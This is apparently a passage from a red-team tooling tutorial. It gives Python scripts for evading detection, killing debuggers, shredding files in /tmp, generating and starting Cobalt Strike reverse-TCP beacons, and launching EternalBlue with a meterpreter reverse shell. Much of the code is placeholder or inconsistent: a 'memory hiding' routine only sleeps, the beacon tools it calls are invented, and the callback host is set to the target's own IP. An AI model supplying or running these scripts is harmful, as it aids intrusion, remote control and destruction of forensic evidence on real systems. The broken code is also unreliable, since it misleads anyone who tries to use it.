Exploit Execution with automated exploitation tools like Metasploit or Cobalt Strike.

Post-exploitation and follow-up actions like persistence or data exfiltration.

Payload Conversion to obfuscate and ensure the payload can bypass defense mechanisms.



---

Option 4: Evasion and Anti-Forensics (Continued)

We’ll now continue with integrating evasion techniques and anti-forensics in the workflow, ensuring the red team tools remain stealthy and undetectable.

Step 3: Advanced Evasion (Anti-Forensics in Exploit Execution)

Memory Manipulation and Anti-Forensics (Exploit.py)

```python
import os
import random
import time
import sys

class MemoryManipulation:
    def __init__(self):
        pass

    def hide_payload_in_memory(self):
        # Using random memory locations for payload injection
        print("Hiding payload in memory...")
        time.sleep(random.uniform(0.5, 2.0))  # Randomized delay to avoid detection by EDR systems

    def disable_debugger(self):
        print("Disabling debuggers...")
        os.system("taskkill /im ollydbg.exe /f")

    def clear_traces(self):
        print("Clearing any traces from memory...")
        os.system("shred -u /tmp/*")

# Example usage
memory_manipulation = MemoryManipulation()
memory_manipulation.hide_payload_in_memory()
memory_manipulation.disable_debugger()
memory_manipulation.clear_traces()

In the exploit execution step:

Memory manipulation techniques are employed to hide payloads from EDRs and detection systems.

Debugging tools like OllyDbg are disabled to ensure no reverse engineering occurs during exploit execution.

Log traces and any other temporary files are cleared to avoid detection during and after exploitation.
```


---

Option 5: Integration with Offensive Tools like Metasploit and Cobalt Strike (Continued)

This option focuses on deep integration with Metasploit and Cobalt Strike, allowing the red team to fully leverage these powerful tools for penetration testing and red teaming operations.

Step 3: Cobalt Strike Integration - Beacon Handling


Cobalt Strike Beacon Management (CobaltStrike.py)

```python
import subprocess
import sys

class CobaltStrikeIntegration:
    def __init__(self, team_server_ip, target_ip):
        self.team_server_ip = team_server_ip
        self.target_ip = target_ip

    def generate_beacon(self):
        print(f"Generating Cobalt Strike beacon for target {self.target_ip}...")
        try:
            subprocess.run(f"./beacon-generator -target {self.target_ip} -server {self.team_server_ip} -type reverse_tcp", shell=True, check=True)
            print("Beacon successfully generated.")
        except subprocess.CalledProcessError as e:
            print(f"Error generating beacon: {e}")
            sys.exit(1)

    def manage_beacon(self):
        print(f"Managing Cobalt Strike beacon for {self.target_ip}...")
        try:
            subprocess.run(f"./beacon-control -target {self.target_ip} -server {self.team_server_ip} -action start", shell=True, check=True)
            print("Beacon started successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Error managing beacon: {e}")
            sys.exit(1)

# Example usage
target_ip = "192.168.1.100"
team_server_ip = "192.168.1.1"
cobaltstrike = CobaltStrikeIntegration(team_server_ip, target_ip)
cobaltstrike.generate_beacon()
cobaltstrike.manage_beacon()
```

This script helps manage Cobalt Strike beacons:

It generates the beacon based on the target IP and team server IP.

It manages the beacon lifecycle, from creation to deployment on the target system.


Step 4: Exploit Execution with Offensive Tools

Now that we have Metasploit and Cobalt Strike integrated, the Exploit Execution stage can trigger exploitation via either tool depending on the situation.

```python
from metasploit_integration import Metasploit
from cobaltstrike_integration import CobaltStrikeIntegration

class OffensiveToolIntegration:
    def __init__(self, target_ip, team_server_ip):
        self.target_ip = target_ip
        self.team_server_ip = team_server_ip
        self.metasploit = Metasploit(target_ip)
        self.cobaltstrike = CobaltStrikeIntegration(team_server_ip, target_ip)

    def execute_attack(self, tool_choice="metasploit"):
        if tool_choice == "metasploit":
            payload = self.metasploit.generate_payload("windows/smb/ms17_010_eternalblue", "windows/x64/meterpreter/reverse_tcp", "192.168.1.100", "4444")
            self.metasploit.execute_exploit(payload)
        elif tool_choice == "cobaltstrike":
            self.cobaltstrike.generate_beacon()
            self.cobaltstrike.manage_beacon()
        else:
            print("Unknown tool selected.")
            sys.exit(1)

# Example usage
target_ip = "192.168.1.100"
team_server_ip = "192.168.1.1"
offensive_tools = OffensiveToolIntegration(target_ip, team_server_ip)
offensive_tools.execute_attack("metasploit")  # or "cobaltstrike"
```
